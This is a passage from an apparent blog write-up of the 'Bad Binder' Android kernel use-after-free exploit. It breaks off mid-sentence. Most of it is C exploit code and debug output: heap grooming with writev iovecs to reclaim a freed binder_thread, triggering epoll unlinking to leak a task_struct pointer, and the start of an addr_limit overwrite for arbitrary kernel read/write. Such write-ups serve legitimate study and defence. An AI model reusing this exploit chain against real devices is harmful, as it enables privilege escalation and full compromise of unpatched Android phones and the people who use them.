        <span class="p">{</span> <span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buf1</span><span class="p">,</span> <span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span> <span class="p">},</span>
        <span class="p">{</span> <span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buf2</span><span class="p">,</span> <span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="p">},</span>
        <span class="p">{</span> <span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buf3</span><span class="p">,</span> <span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf3</span><span class="p">)</span> <span class="p">},</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">writev</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">bufs</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">bufs</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="n">bufs</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"writev()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>output:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Hello, Wikipedia Community!
</pre></table></code></div></div><h4 id="vectored-io-internals"><span class="mr-2">Vectored I/O Internals</span><a href="#vectored-io-internals" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The reason why <code class="language-plaintext highlighter-rouge">iovec</code> is interesting is due to how array of <code class="language-plaintext highlighter-rouge">struct iovec</code> gets allocated in kernel. For example above, will create <code class="language-plaintext highlighter-rouge">kmalloc-64</code> (in Linux) and <code class="language-plaintext highlighter-rouge">kmalloc-128</code> (In Android. Smallest cache size). Therefore, if we can make enough <code class="language-plaintext highlighter-rouge">iovecs</code> we should be able to allocate <code class="language-plaintext highlighter-rouge">kmalloc-512</code> to get placed on where <code class="language-plaintext highlighter-rouge">binder_thread</code> used to be.</p><h4 id="allocating-any-kmalloc-size"><span class="mr-2">Allocating Any kmalloc size</span><a href="#allocating-any-kmalloc-size" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">struct iovec</code> is <code class="language-plaintext highlighter-rouge">16</code> bytes.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">iovec</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="n">iov_base</span><span class="p">;</span>    <span class="cm">/* BSD uses caddr_t (1003.1g requires void *) */</span>
    <span class="n">__kernel_size_t</span> <span class="n">iov_len</span><span class="p">;</span> <span class="cm">/* Must be size_t (1003.1g) */</span>
<span class="p">};</span>
</pre></table></code></div></div><p>When you call <code class="language-plaintext highlighter-rouge">writev</code> with array of <code class="language-plaintext highlighter-rouge">iovec</code>, it will eventually call <code class="language-plaintext highlighter-rouge">rw_copy_check_uvector</code> and it will <code class="language-plaintext highlighter-rouge">kmalloc</code> with size <code class="language-plaintext highlighter-rouge">nr_segs*sizeof(struct iovec)</code> where <code class="language-plaintext highlighter-rouge">nr_segs</code> being number of <code class="language-plaintext highlighter-rouge">iovec</code> and <code class="language-plaintext highlighter-rouge">sizeof(struct iovec)</code>.</p><p><strong>Meaning we can create any size <code class="language-plaintext highlighter-rouge">kmalloc</code> cache with writev</strong></p><pre><code class="language-mermaid">flowchart TD
writev --&gt; vfs_writev --&gt; import_iovec --&gt; f1["rw_copy_check_uvector"] --&gt; rw_copy_check_uvector --&gt; f2["iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL)"]
</code></pre><h3 id="leaking-task_struct"><span class="mr-2">Leaking task_struct</span><a href="#leaking-task_struct" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">leak_task_struct</span><span class="p">()</span>
</pre></table></code></div></div><p><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">High Level View of leaking task_struct from P0</a> <a href="/assets/img/2023-05-27-16-42-06.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-42-06.png" alt="" class="lazyload" data-proofer-ignore></a></p><h4 id="initializing-for-task_struct-leak"><span class="mr-2">Initializing for task_struct leak</span><a href="#initializing-for-task_struct-leak" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c1">// Creates mmap with addr 0x1_0000_0000 and set m_lock_page</span>
<span class="n">create_lock_page</span><span class="p">();</span> 
<span class="kt">int</span> <span class="n">pipe_fd</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">char</span> <span class="n">data_buffer</span><span class="p">[</span><span class="n">PAGE_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="c1">// </span>
<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iovecs</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">binder_fd</span> <span class="o">=</span> <span class="n">open_binder</span><span class="p">();</span>
<span class="kt">int</span> <span class="n">epfd</span> <span class="o">=</span> <span class="n">create_epoll</span><span class="p">();</span>

<span class="n">pipe</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">);</span>
<span class="n">fcntl</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">F_SETPIPE_SZ</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">)</span>

<span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">m_lock_page</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.lock</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.next</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.prev</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

<span class="n">epoll_add</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">binder_fd</span><span class="p">);</span>
</pre></table></code></div></div><h5 id="create_lock_page"><span class="mr-2">create_lock_page()</span><a href="#create_lock_page" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">create_lock_page</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">m_lock_page</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span>
        <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x100000000ul</span><span class="p">,</span>
        <span class="n">PAGE_SIZE</span><span class="p">,</span>
        <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
        <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Sets <code class="language-plaintext highlighter-rouge">BadBinder::m_lock_page</code> to <code class="language-plaintext highlighter-rouge">0x1_0000_0000</code> (Lower 32bit are all 0s). Reason being <code class="language-plaintext highlighter-rouge">binder_thread.wait.lock</code>’s lower 32bit needs to be all 0 or else cpu will just get locked.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">wait_queue_head</span> <span class="p">{</span>
    <span class="n">spinlock_t</span>		<span class="n">lock</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">list_head</span>	<span class="n">head</span><span class="p">;</span>
<span class="p">};</span>
</pre></table></code></div></div><h5 id="creating-iovecs"><span class="mr-2">Creating iovecs</span><a href="#creating-iovecs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">iovec</span> <span class="n">iovecs</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</pre></table></code></div></div><p>Create <code class="language-plaintext highlighter-rouge">struct iovec iovecs[25]</code>. 25 * 16 <code class="language-plaintext highlighter-rouge">(sizeof(iovec))</code> = 400 bytes which means it will be allocated in <code class="language-plaintext highlighter-rouge">kmalloc-512</code>. There is reason why it is <strong>400</strong>. This will be explained later.</p><h5 id="allocate-binder-and-epoll-struct"><span class="mr-2">Allocate binder and epoll struct</span><a href="#allocate-binder-and-epoll-struct" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">binder_fd</span> <span class="o">=</span> <span class="n">open_binder</span><span class="p">();</span>
<span class="kt">int</span> <span class="n">epfd</span> <span class="o">=</span> <span class="n">create_epoll</span><span class="p">();</span>
</pre></table></code></div></div><p>We need these so that it can create <code class="language-plaintext highlighter-rouge">struct binder_thread</code> and <code class="language-plaintext highlighter-rouge">struct eventpoll</code></p><h5 id="create-pipes"><span class="mr-2">Create pipes</span><a href="#create-pipes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">pipe</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">);</span>
<span class="n">fcntl</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">F_SETPIPE_SZ</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">)</span>
</pre></table></code></div></div><p>Create a <code class="language-plaintext highlighter-rouge">pipe</code> so we can have IPC between <code class="language-plaintext highlighter-rouge">parent</code> and <code class="language-plaintext highlighter-rouge">child</code> from <code class="language-plaintext highlighter-rouge">fork</code>. Then set pipe size to PAGE_SIZE (0x1000). For each read, it will be PAGE_SIZE.</p><h5 id="set-iovecs"><span class="mr-2">Set iovecs</span><a href="#set-iovecs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">m_lock_page</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.lock</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.next</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.prev</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
</pre></table></code></div></div><p><a href="/assets/img/2023-05-27-16-42-56.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-42-56.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Set <code class="language-plaintext highlighter-rouge">iovecs</code> so that it aligns with <code class="language-plaintext highlighter-rouge">binder_thread.wait</code> which is <code class="language-plaintext highlighter-rouge">iovecs[10]</code>. Here we set the <code class="language-plaintext highlighter-rouge">wait.lock</code> to our <code class="language-plaintext highlighter-rouge">mmap</code> address with lower 32 bit all 0 so that it doesn’t lock unlinking. Also we should be able to read <code class="language-plaintext highlighter-rouge">m_lock_page</code> since we allocated it with PAGE_SIZE.</p><p>Then we set <code class="language-plaintext highlighter-rouge">iovecs[11].iov_base</code> to any junk. This shouldn’t matter. <code class="language-plaintext highlighter-rouge">iovecs[11].iov_len</code>, we will set <code class="language-plaintext highlighter-rouge">PAGE_SIZE</code>. This is set to <code class="language-plaintext highlighter-rouge">PAGE_SIZE</code> but it doesn’t have to be this big since we only need to leak up to <code class="language-plaintext highlighter-rouge">sizeof(struct binder_thread - 0xA0)</code>.</p><p>Remember when we do unlinking by calling <code class="language-plaintext highlighter-rouge">epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, NULL);</code>, operation will be something like below</p><p><a href="/assets/img/2023-05-27-16-43-32.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-43-32.png" alt="" class="lazyload" data-proofer-ignore></a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>// list_del dump during unlinking
// __list_del
//  next: 0xffff88803a8fcca8 (addr eppoll_event.wait.next pointing to )
//  prev: 0xffff88803a8fcca8
//  next-&gt;prev: 0x0000000041414141
//  prev-&gt;next: 0x0000000000001000
//          next-&gt;prev = prev
//          prev-&gt;next = next
</pre></table></code></div></div><p>which is equivalent to</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">//0xa8 since 0xa0 is where binder_thread.wait.lock is. wait.next is 0xa8</span>
<span class="o">*</span><span class="p">(</span><span class="n">iovecs_kmalloc_ptr</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span> <span class="o">=</span> <span class="n">iovecs_kmalloc_ptr</span><span class="o">+</span><span class="mh">0xa8</span> 
<span class="o">*</span><span class="p">(</span><span class="n">iovecs_kmalloc_ptr</span><span class="o">+</span><span class="mh">0xa8</span><span class="p">)</span> <span class="o">=</span> <span class="n">iovecs_kmalloc_ptr</span><span class="o">+</span><span class="mh">0xa8</span>
</pre></table></code></div></div><h4 id="linking-binder_thread-and-eppoll_event"><span class="mr-2">Linking binder_thread and eppoll_event</span><a href="#linking-binder_thread-and-eppoll_event" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">epoll_add</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">binder_fd</span><span class="p">);</span>
</pre></table></code></div></div><p>Connecting structure together. Explained at <a href="#linking-epitem---epoll_entry---binder_thread">Linking epitem -&gt; epoll_entry -&gt; binder_thread</a></p><h4 id="forking"><span class="mr-2">Forking</span><a href="#forking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">pid_t</span> <span class="n">leak_pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</pre></table></code></div></div><p>We will now have <code class="language-plaintext highlighter-rouge">child</code> and <code class="language-plaintext highlighter-rouge">parent</code> happening at same time. But first we will look at <code class="language-plaintext highlighter-rouge">parent</code> because <code class="language-plaintext highlighter-rouge">child</code> will <code class="language-plaintext highlighter-rouge">sleep(2)</code>.</p><h5 id="parent-process-free-binder_thread-and-allocate-iovecs"><span class="mr-2">(Parent Process) Free binder_thread and Allocate Iovecs</span><a href="#parent-process-free-binder_thread-and-allocate-iovecs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">binder_thread_exit</span><span class="p">(</span><span class="n">binder_fd</span><span class="p">);</span>
<span class="c1">// Should wrote PAGE_SIZE*2 since we have two iovec with PAGE_SIZE</span>
<span class="n">writev</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">iovecs</span><span class="p">,</span> <span class="n">IOVEC_COUNT</span><span class="p">);</span>
</pre></table></code></div></div><p>This will free <code class="language-plaintext highlighter-rouge">binder_thread</code> which will leave <code class="language-plaintext highlighter-rouge">kmalloc-512</code> cache freed. We fill that address with our <code class="language-plaintext highlighter-rouge">iovecs</code> by doing <code class="language-plaintext highlighter-rouge">writev</code></p><p><code class="language-plaintext highlighter-rouge">writev</code> should be blocking until child does <code class="language-plaintext highlighter-rouge">read</code> with <code class="language-plaintext highlighter-rouge">PAGE_SIZE</code> since we set <code class="language-plaintext highlighter-rouge">pipe</code> to <code class="language-plaintext highlighter-rouge">PAGE_SIZE</code></p><h5 id="child-process--cause-unlinking"><span class="mr-2">(Child Process) Cause unlinking</span><a href="#child-process--cause-unlinking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// Block so parent can setup iovecs kmalloc</span>
<span class="n">epoll_del</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">binder_fd</span><span class="p">);</span> <span class="c1">// Cause Unlinking (list_del)</span>
<span class="n">read</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">data_buffer</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span> <span class="c1">// Should read PAGE_SIZE</span>
<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
</pre></table></code></div></div><p>At this state, we should have caused where <code class="language-plaintext highlighter-rouge">binder_thread</code> used to be with our <code class="language-plaintext highlighter-rouge">iovecs</code>. Calling <code class="language-plaintext highlighter-rouge">epoll_del</code> will cause <code class="language-plaintext highlighter-rouge">unlinking</code>. Then we call <code class="language-plaintext highlighter-rouge">read</code> so that parent’s <code class="language-plaintext highlighter-rouge">writev</code> gets unblocked and exit.</p><p>It should have done operation below</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">//0xa8 since 0xa0 is where binder_thread.wait.lock is. wait.next is 0xa8</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">iovecs_kmalloc_ptr</span><span class="o">+</span><span class="mh">0xa8</span> 
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">iovecs_kmalloc_ptr</span><span class="o">+</span><span class="mh">0xa8</span>
</pre></table></code></div></div><h5 id="parent-process-read-task_struct"><span class="mr-2">(Parent Process) Read task_struct</span><a href="#parent-process-read-task_struct" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1">// Read iovecs[11]</span>
<span class="n">read</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">data_buffer</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
<span class="c1">// Wait till child exit</span>
<span class="n">wait</span><span class="p">(</span><span class="n">nullptr</span><span class="p">);</span>

<span class="c1">// TASK_STRUCT_OFFSET_IN_LEAKED_DATA == 0xe8</span>
<span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="kt">int64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">data_buffer</span> <span class="o">+</span> <span class="n">TASK_STRUCT_OFFSET_IN_LEAKED_DATA</span><span class="p">));</span>
</pre></table></code></div></div><p><strong>data_buffer hexdump</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>// dump after leak read

0x000000: a8 cc 8f 3a 80 88 ff ff a8 cc 8f 3a 80 88 ff ff  ...:.......:....
0x000010: 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
                             [...]
0x0000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x0000e0: 00 00 00 00 00 00 00 00 00 ee 81 3a 80 88 ff ff  ...........:....

</pre></table></code></div></div><p><strong>struct binder_thread</strong></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">binder_thread</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">;</span>
    <span class="p">[...]</span>
    <span class="n">wait_queue_head_t</span> <span class="n">wait</span><span class="p">;</span> <span class="c1">// offset 160 (0xa0)</span>
    <span class="p">{</span>
        <span class="p">.</span><span class="n">lock</span> <span class="c1">// offset 160 (0xa0)</span>
        <span class="p">.</span><span class="n">next</span> <span class="c1">// offset 168 (0xa8)</span>
        <span class="p">.</span><span class="n">prev</span> <span class="c1">// offset 175 (0xb0)</span>
    <span class="p">}</span>
    <span class="p">[...]</span>
    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span> <span class="c1">// offset 400 (0x190)</span>
<span class="p">};</span>
</pre></table></code></div></div><p>When we read the data, it will be from where <code class="language-plaintext highlighter-rouge">binder_thread.wait.next</code> used to be which is offset <code class="language-plaintext highlighter-rouge">0xa8</code>. If you want to to get to task_struct you would need to get <code class="language-plaintext highlighter-rouge">uint64_t</code> of <code class="language-plaintext highlighter-rouge">data_buffer+0xe8</code>. <code class="language-plaintext highlighter-rouge">0xe8</code> is from <code class="language-plaintext highlighter-rouge">task_struct_offset (0x190)- wait.next (0xa8)</code>.</p><h3 id="overriding-addr_limit"><span class="mr-2">Overriding addr_limit</span><a href="#overriding-addr_limit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In <code class="language-plaintext highlighter-rouge">task_struct</code> there is a field named <code class="language-plaintext highlighter-rouge">addr_limit</code> which is used to validate where user process can write/read to/from. We know that higher virtual address is used for kernel address. If we can override this field with <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFE</code>, we should be able to write to any address giving us <code class="language-plaintext highlighter-rouge">Arbitary R/W</code>. The reason why it is <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFE</code> instead of <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFF</code> is explained in these blog. <a href="https://duasynt.com/blog/android-uao-kernel-expl-mitigation">duasynt</a>and <a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer">HackSysTeam</a> Another gotcha are that we can’t use <code class="language-plaintext highlighter-rouge">readv</code> to write to our <code class="language-plaintext highlighter-rouge">iovecs</code>. The reason being is that <code class="language-plaintext highlighter-rouge">readv</code> will not process one <code class="language-plaintext highlighter-rouge">iovec</code>. This means that when you try to read data to <code class="language-plaintext highlighter-rouge">iovecs</code>, it will try to copy all sum of <code class="language-plaintext 